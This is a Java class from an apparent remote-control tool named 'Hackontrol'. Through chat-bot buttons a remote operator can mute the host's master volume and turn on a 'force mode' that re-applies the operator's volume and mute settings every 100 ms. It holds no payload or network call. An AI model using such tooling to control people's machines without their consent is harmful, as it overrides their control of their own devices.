package com.khopan.hackontrol.utils;

import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

import com.khopan.hackontrol.manager.interaction.ButtonContext;
import com.khopan.hackontrol.manager.interaction.Question;
import com.khopan.hackontrol.manager.interaction.Question.QuestionType;
import com.khopan.hackontrol.nativelibrary.User;

public class Sound {
	public static final String MODAL_IDENTIFIER = "volumeChangeModal";

	private volatile float volume;
	private volatile boolean mute;
	private volatile boolean forceMode;

	public void mute(ButtonContext context) {
		this.buttonMute(context, true);
	}

	public void unmute(ButtonContext context) {
		this.buttonMute(context, false);
	}

	public void force(ButtonContext context) {
		this.buttonForceMode(context, true);
	}

	public void unforce(ButtonContext context) {
		this.buttonForceMode(context, false);
	}

	public void initialize() {
		Executors.newSingleThreadScheduledExecutor().scheduleAtFixedRate(() -> {
			if(!this.forceMode) {
				return;
			}

			if(User.getMasterVolume() != this.volume) {
				User.setMasterVolume(this.volume);
			}

			if(User.isMute() != this.mute) {
				User.setMute(this.mute);
			}
		}, 0, 100, TimeUnit.MILLISECONDS);
	}

	private void buttonMute(ButtonContext context, boolean mute) {
		if((this.forceMode ? this.mute : User.isMute()) == mute) {
			HackontrolMessage.boldDeletable(context.reply(), "Master volume is already " + (mute ? "muted" : "unmuted"));
			return;
		}

		if(!mute) {
			Question.positive(context.reply(), "Are you sure you want to unmute?", QuestionType.YES_NO, () -> {
				if(this.forceMode) {
					this.mute = false;
				} else {
					User.setMute(false);
				}
			});

			return;
		}

		if(this.forceMode) {
			this.mute = true;
		} else {
			User.setMute(true);
		}

		context.deferEdit().queue();
	}

	private void buttonForceMode(ButtonContext context, boolean enable) {
		if(this.forceMode == enable) {
			HackontrolMessage.boldDeletable(context.reply(), "Force mode is already " + (enable ? "enabled" : "disabled"));
			return;
		}

		if(!enable) {
			Question.positive(context.reply(), "Are you sure you want to disable force mode?", QuestionType.YES_NO, () -> this.forceMode = false);
			return;
		}

		this.volume = User.getMasterVolume();
		this.mute = User.isMute();
		this.forceMode = true;
		context.deferEdit().queue();
	}
}
